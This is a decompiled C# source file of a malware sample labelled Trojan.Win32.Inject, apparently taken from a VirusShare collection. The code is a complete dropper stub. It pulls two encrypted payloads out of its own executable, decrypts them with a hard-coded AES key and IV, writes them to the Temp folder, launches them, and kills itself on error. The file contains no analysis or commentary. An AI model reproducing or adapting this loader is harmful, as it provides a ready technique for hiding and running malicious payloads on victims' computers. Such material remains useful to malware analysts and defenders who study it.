// Decompiled with JetBrains decompiler
// Type: Module1
// Assembly: fallout, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3359D2F6-0FBB-4C1A-A1DB-7C57F372F1CC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Inject.uvxg-6123eddbb7afa39db7d3e07a686e50048fab17ad59147fdc1a31561b77476650.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

[StandardModule]
internal sealed class Module1
{
  [STAThread]
  public static void Main()
  {
    try
    {
      string temp = MyProject.Computer.FileSystem.SpecialDirectories.Temp;
      string[] strArray = Strings.Split(File.ReadAllText(Assembly.GetExecutingAssembly().Location), "CvRHIFFHGSC");
      byte[] data1 = Module1.Unsecure(Convert.FromBase64String(strArray[1]));
      byte[] data2 = Module1.Unsecure(Convert.FromBase64String(strArray[3]));
      MyProject.Computer.FileSystem.WriteAllBytes(temp + "\\" + strArray[2], data1, false);
      MyProject.Computer.FileSystem.WriteAllBytes(temp + "\\" + strArray[4], data2, false);
      Process.Start(temp + "\\" + strArray[2]);
      Process.Start(temp + "\\" + strArray[4]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Process.GetCurrentProcess().Kill();
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().Kill();
  }

  public static byte[] Unsecure(byte[] data)
  {
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
      rijndaelManaged.IV = new byte[16]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7
      };
      rijndaelManaged.Key = new byte[16]
      {
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1,
        (byte) 9,
        (byte) 8,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1
      };
      return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
    }
  }
}
